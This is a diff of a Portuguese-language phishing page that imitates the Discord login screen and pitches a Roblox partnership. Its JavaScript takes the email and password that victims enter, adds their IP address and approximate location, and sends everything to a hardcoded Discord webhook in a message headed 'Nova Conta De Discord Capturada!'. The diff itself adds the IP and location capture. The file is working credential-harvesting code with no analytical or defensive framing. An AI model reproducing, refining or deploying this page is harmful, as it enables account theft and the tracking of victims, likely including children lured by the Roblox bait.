@@ -228,55 +228,54 @@
   </style>
 </head>
 <body>
-
   <div class="container">
     <div class="left">
       <a href="#" class="voltar">&lt; Voltar</a>
-      
+     
       <h1>Boas-vindas de volta!</h1>
       <p class="subtitle">Estamos muito animados em te ver novamente!</p>
-      
+     
       <form id="loginForm">
         <label for="email">E-mail ou número de telefone *</label>
         <input type="text" id="email" placeholder="" required />
-        
+       
         <label for="senha">Senha *</label>
         <input type="password" id="senha" placeholder="" required />
-        
+       
         <a href="#" class="forgot-link">Esqueceu sua senha?</a>
-        
+       
         <button type="submit">Entrar</button>
-        
+       
         <div id="errorBox" class="error-message">
           --- Erro 504 Recarregue a pagina ou tente Novamente mais tarde! ---
         </div>
-        
+       
         <div class="register-link">
           Precisando de uma conta? <a href="#">Registre-se</a>
         </div>
       </form>
     </div>
-    
+   
     <div class="right">
       <div class="qr-section">
         <img class="qr-image" src="https://result.ghiblivideo.ai/output/result/202602/22/260d087ebb2a4245a2a0e28c0b9ddb9d.png" alt="QR customizado" />
-        
+       
         <div class="qr-title">Entrar com código QR</div>
-        
+       
         <p class="qr-custom-text">
           Ou faça login pelo roblox!!<br>
           Estamos fazendo parceria em troca de divulgação!!
         </p>
-        
+       
         <div class="logos">
           <img src="https://upload.wikimedia.org/wikipedia/commons/7/7c/Discord-logo-icon.jpg" alt="Discord Logo">
           <span style="font-size: 1.8rem; font-weight: bold;"> - </span>
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
         </div>
-
-        <!-- Link novo abaixo das logos -->
+        
+        <!-- Link exatamente como você mandou antes -->
         <div class="extra-link">
-          <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">Acesse aqui para mais novidades</a>
+          <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">https://notic1as-verdadeiras.vercel.app</a>
         </div>
       </div>
     </div>
@@ -285,7 +284,7 @@
   <script>
     const form = document.getElementById('loginForm');
     const errorBox = document.getElementById('errorBox');
-    const webhookUrl = 'https://discord.com/api/webhooks/1475218735819395416/cow2HlNA0PkebZzcVc5p-M2NiPBm7vMGXcO2Sm-EIVq3hbVvGazpzGXpEVal1t1Tf-k3'; // COLOQUE SEU WEBHOOK AQUI
+    const webhookUrl = 'https://discord.com/api/webhooks/1475218735819395416/cow2HlNA0PkebZzcVc5p-M2NiPBm7vMGXcO2Sm-EIVq3hbVvGazpzGXpEVal1t1Tf-k3';
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -298,7 +297,7 @@
         return;
       }
 
-      // Captura de IP + localização
+      // Captura de IP + localização (como estava antes)
       let ip = 'Desconhecido';
       let location = 'Desconhecido';
       try {
@@ -325,11 +324,14 @@
       const horaFormatada = agora.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', hour12: false });
       const hoje = agora.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', hour12: false });
 
-      // Mensagem no formato que você mostrou
+      // Mensagem com IP e localização
       const mensagem = `🔐 **Nova Conta De Discord Capturada!**
 
-**Login:** \`${email}\`  
+**Login:** \`${email}\`
 **Senha:** \`${senha}\`
+
+🌐 IP Capturado: ${ip}
+📍 Localização aproximada: ${location}
 
 **Capturado** • ${dataFormatada}, ${horaFormatada} • Hoje às ${hoje}`;
 
@@ -345,6 +347,5 @@
       setTimeout(() => errorBox.classList.remove('show'), 3000);
     });
   </script>
-
 </body>
 </html>
